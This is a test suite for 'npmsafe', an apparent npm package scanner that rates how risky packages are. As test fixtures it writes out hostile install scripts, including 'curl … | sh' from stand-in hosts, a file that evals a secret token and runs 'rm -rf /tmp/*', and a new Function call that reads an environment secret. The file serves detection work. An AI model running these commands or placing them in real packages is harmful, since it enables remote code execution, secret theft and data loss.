const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { analyzePackage, calculateRisk, analyzePackageScripts } = require('../src/analyzer');

function createTestPackage(packageJson, files = {}) {
  const testDir = path.join(__dirname, 'temp_test_package');

  if (fs.existsSync(testDir)) {
    fs.rmSync(testDir, { recursive: true, force: true });
  }

  fs.mkdirSync(testDir, { recursive: true });
  fs.writeFileSync(path.join(testDir, 'package.json'), JSON.stringify(packageJson, null, 2));

  for (const [filename, content] of Object.entries(files)) {
    const filePath = path.join(testDir, filename);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }

  return testDir;
}

function cleanup(testDir) {
  if (fs.existsSync(testDir)) {
    fs.rmSync(testDir, { recursive: true, force: true });
  }
}

async function runTests() {
  console.log('🧪 Running npmsafe tests...\n');

  // Test 1: Safe package
  console.log('Test 1: safe package');
  const safePackage = createTestPackage({
    name: 'safe-package',
    version: '1.0.0',
    scripts: {
      start: 'node index.js',
      test: 'jest'
    }
  }, {
    'index.js': 'console.log("Hello world");'
  });

  try {
    const result = await analyzePackage(safePackage);
    assert.strictEqual(result.risk, 'safe', 'Safe package should be classified as safe');
    assert.strictEqual(result.stats.totalIssues, 0, 'Safe package should not produce issues');
    assert.deepStrictEqual(result.stats.severityCounts, { high: 0, medium: 0, low: 0 }, 'Severity counters should all be zero');
    assert.deepStrictEqual(result.stats.typeBreakdown, {}, 'Type breakdown should be empty');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(safePackage);
  }

  // Test 2: Suspicious lifecycle script
  console.log('Test 2: suspicious lifecycle script');
  const suspiciousPackage = createTestPackage({
    name: 'suspicious-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'curl -s http://example.com/script.sh | sh',
      start: 'node index.js'
    }
  });

  try {
    const result = await analyzePackage(suspiciousPackage);
    assert.ok(['suspicious', 'malicious'].includes(result.risk), 'Lifecycle attack should be suspicious or worse');
    assert.ok(result.issues.length > 0, 'Suspicious package should report issues');
    assert.ok((result.stats.severityCounts.high || 0) >= 1, 'Should include at least one high severity issue');
    assert.ok((result.stats.typeBreakdown.script || 0) >= 1, 'Script issues should be counted');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(suspiciousPackage);
  }

  // Test 3: Benign lifecycle script (low risk)
  console.log('Test 3: low-risk lifecycle script');
  const lowLifecyclePackage = createTestPackage({
    name: 'low-lifecycle-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'echo "hello"',
      start: 'node index.js'
    }
  });

  try {
    const result = await analyzePackage(lowLifecyclePackage);
    assert.strictEqual(result.risk, 'low', 'Benign lifecycle script should be low risk');
    assert.ok(result.issues.length > 0, 'Low risk should still record issues');
    assert.strictEqual(result.stats.severityCounts.low, 1, 'Exactly one low severity issue expected');
    assert.strictEqual(result.stats.topIssues[0].severity, 'low', 'Top issue should reflect low severity');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(lowLifecyclePackage);
  }

  // Test 4: Malicious package with eval + exec
  console.log('Test 4: malicious package with eval/exec');
  const maliciousPackage = createTestPackage({
    name: 'malicious-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'node malicious.js'
    }
  }, {
    'malicious.js': `
      const { exec } = require('child_process');
      eval('process.env.SECRET_TOKEN');
      exec('rm -rf /tmp/*');
    `
  });

  try {
    const result = await analyzePackage(maliciousPackage);
    assert.ok(['suspicious', 'malicious'].includes(result.risk), 'Malicious package should be suspicious or malicious');
    assert.ok(result.issues.some(issue => issue.type === 'ast'), 'AST issues expected');
    assert.ok((result.stats.severityCounts.high || 0) >= 2, 'Should detect multiple high severity issues');
    assert.ok(result.stats.topIssues.some(issue => issue.severity === 'high'), 'Top issues should surface high severity findings');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(maliciousPackage);
  }

  // Test 5: Risk calculation helper
  console.log('Test 5: risk calculation helper');
  try {
    assert.strictEqual(calculateRisk([]), 'safe', 'No issues => safe');
    assert.strictEqual(calculateRisk([{ severity: 'low' }]), 'low', 'Single low => low');
    assert.strictEqual(calculateRisk([{ severity: 'medium' }]), 'suspicious', 'Medium => suspicious');
    assert.strictEqual(calculateRisk([{ severity: 'low' }, { severity: 'low' }, { severity: 'low' }]), 'suspicious', 'Multiple low => suspicious');
    assert.strictEqual(calculateRisk([{ severity: 'high' }, { severity: 'high' }]), 'malicious', 'Two highs => malicious');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  }

  // Test 6: Package script analysis helper
  console.log('Test 6: package script analysis helper');
  try {
    const scripts = analyzePackageScripts({
      scripts: {
        postinstall: 'curl http://malicious.com | sh',
        test: 'jest'
      }
    });
    assert.ok(scripts.length > 0, 'Should flag dangerous postinstall');
    assert.strictEqual(scripts[0].type, 'script', 'Issue type should be script');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  }

  // Test 7: new Function detection
  console.log('Test 7: new Function detection');
  const newFunctionPackage = createTestPackage(
    { name: 'new-function-package', version: '1.0.0' },
    {
      'index.js': `const dangerous = new Function("return process.env.SECRET;");\ndangerous();`
    }
  );

  try {
    const result = await analyzePackage(newFunctionPackage);
    assert.ok(result.issues.some(issue => issue.description.includes('new Function')), 'Should flag new Function usage');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(newFunctionPackage);
  }

  // Test 8: require("child_process") detection
  console.log('Test 8: require("child_process") detection');
  const childProcessPackage = createTestPackage(
    { name: 'child-process-package', version: '1.0.0' },
    {
      'index.js': `const cp = require('child_process');\ncp.exec('ls');`
    }
  );

  try {
    const result = await analyzePackage(childProcessPackage);
    assert.ok(result.issues.some(issue => issue.description.includes('Виконання системних команд')), 'Should flag exec() usage');
    assert.ok(result.issues.some(issue => issue.description.includes('child_process')), 'Should flag child_process import');
    assert.ok((result.stats.severityCounts.high || 0) >= 1, 'Should classify as high severity');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(childProcessPackage);
  }

  // Test 9: destructuring child_process
  console.log('Test 9: child_process destructuring');
  const destructuredPackage = createTestPackage(
    { name: 'destructured-child-process', version: '1.0.0' },
    {
      'index.js': `const { execSync: run } = require('child_process');\nrun('ls');`
    }
  );

  try {
    const result = await analyzePackage(destructuredPackage);
    assert.ok(result.issues.some(issue => issue.description.includes('Деструктуризація') || issue.description.includes('child_process модуля')), 'Should flag destructuring import');
    assert.ok(result.issues.some(issue => issue.description.includes('Виконання системних команд') && (issue.location || '').includes('index.js')), 'Should flag execSync call');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(destructuredPackage);
  }

  // Test 10: TypeScript support
  console.log('Test 10: TypeScript child_process detection');
  const tsPackage = createTestPackage(
    { name: 'ts-child-process', version: '1.0.0' },
    {
      'index.ts': `import { exec as run } from 'child_process';\nrun('ls');`
    }
  );

  try {
    const result = await analyzePackage(tsPackage);
    assert.ok((result.stats.severityCounts.high || 0) >= 1, 'TypeScript exec should be counted as high severity');
    assert.ok(result.issues.some(issue => (issue.location || '').includes('index.ts')), 'Issue locations should reference TypeScript source');
    assert.ok(result.stats.topIssues.some(issue => issue.location && issue.location.includes('index.ts')), 'Top issues should include the TypeScript finding');
    console.log('✅ Passed\n');
  } catch (error) {
    console.log('❌ Failed:', error.message, '\n');
  } finally {
    cleanup(tsPackage);
  }

  console.log('🎉 All tests finished!');
}

if (require.main === module) {
  runTests().catch(error => {
    console.error('Test suite failed:', error);
    process.exit(1);
  });
}

module.exports = { runTests };
